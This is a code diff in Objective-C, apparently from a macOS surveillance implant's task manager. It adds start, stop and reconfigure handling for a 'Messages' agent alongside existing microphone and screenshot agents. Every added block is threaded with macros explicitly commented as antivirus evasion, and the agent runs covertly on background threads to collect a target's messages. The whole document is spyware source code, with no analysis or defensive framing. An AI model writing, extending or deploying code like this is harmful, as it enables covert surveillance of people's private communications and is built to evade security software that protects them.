@@ -23,6 +23,8 @@
 
 #import "RCSMAgentMicrophone.h"
 
+#import "RCSMAgentMessages.h"
+
 #import "NSMutableDictionary+ThreadSafe.h"
 
 #import "RCSMInfoManager.h"
@@ -771,6 +773,52 @@ static NSLock *gSyncLock                  = nil;
   
   switch (agentID)
     {
+        case AGENT_MESSAGES:
+        {
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Starting Agent Messages");
+#endif
+            __m_MAgentMessages *agentMessages = [__m_MAgentMessages sharedInstance];
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+            
+            if (agentConfiguration == nil)
+            {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Internal config for agent Messages not found");
+#endif
+                return FALSE;
+            }
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
+            [agentConfiguration setObject: AGENT_START
+                                   forKey: @"status"];
+            
+            [agentMessages setAgentConfiguration: agentConfiguration];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentMessages
+                                   withObject: nil];
+            
+/*
+        NSString *conf = [agentConfiguration objectForKey:@"data"];
+#ifdef DEBUG_MESSAGES
+            infoLog(@"conf agent msg: %@",conf);
+#endif
+*/
+        
+        }
+        break;
     case AGENT_SCREENSHOT:
       {  
         // AV evasion: only on release build
@@ -1795,6 +1843,43 @@ static NSLock *gSyncLock                  = nil;
   
   switch (agentID)
   {
+      case AGENT_MESSAGES:
+      {
+          // AV evasion: only on release build
+          AV_GARBAGE_009
+          
+#ifdef DEBUG_TASK_MANAGER
+          warnLog(@"Stopping Agent Messages");
+#endif
+          __m_MAgentMessages *agentMessages = [__m_MAgentMessages sharedInstance];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+          
+          if ([agentMessages stop] == FALSE)
+          {
+#ifdef DEBUG_TASK_MANAGER
+              errorLog(@"Error while stopping agent Messages");
+#endif
+              return NO;
+          }
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
+          agentConfiguration = [self getConfigForAgent: agentID];
+          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Messages stopped correctly");
+#endif
+          
+      }
+      break;
+          
     case AGENT_SCREENSHOT:
     {
       // AV evasion: only on release build
@@ -2493,6 +2578,36 @@ static NSLock *gSyncLock                  = nil;
     {
       switch (agentID)
       {
+              
+        case AGENT_MESSAGES:
+        {
+        // AV evasion: only on release build
+        AV_GARBAGE_000
+            
+        __m_MAgentMessages *agentMessages = [__m_MAgentMessages sharedInstance];
+            
+        // AV evasion: only on release build
+        AV_GARBAGE_001
+            
+        if ([agentMessages stop] == FALSE)
+            {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Error while stopping agent Messages");
+#endif
+                //return NO;
+            }
+            else
+            {
+                // AV evasion: only on release build
+                AV_GARBAGE_007
+                
+                [anObject setObject: AGENT_STOPPED forKey: @"status"];
+            }
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Messages stopped correctly");
+#endif
+        }
+        break;
         case AGENT_SCREENSHOT:
         {          
           // AV evasion: only on release build
@@ -3020,6 +3135,30 @@ static NSLock *gSyncLock                  = nil;
         {
           switch (agentID)
             {
+            case AGENT_MESSAGES:
+                {
+                // AV evasion: only on release build
+                AV_GARBAGE_006
+                    
+                __m_MAgentMessages *agentMessages = [__m_MAgentMessages sharedInstance];
+                agentConfiguration = [[anObject objectForKey: @"data"] retain];
+                    
+                // AV evasion: only on release build
+                AV_GARBAGE_007
+                    
+                [anObject setObject: AGENT_START
+                                 forKey: @"status"];
+                [agentMessages setAgentConfiguration: anObject];
+                    
+                // AV evasion: only on release build
+                AV_GARBAGE_004
+                    
+                [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentMessages
+                                           withObject: nil];
+                    
+                }
+                break;
             case AGENT_SCREENSHOT:
               {         
                 // AV evasion: only on release build
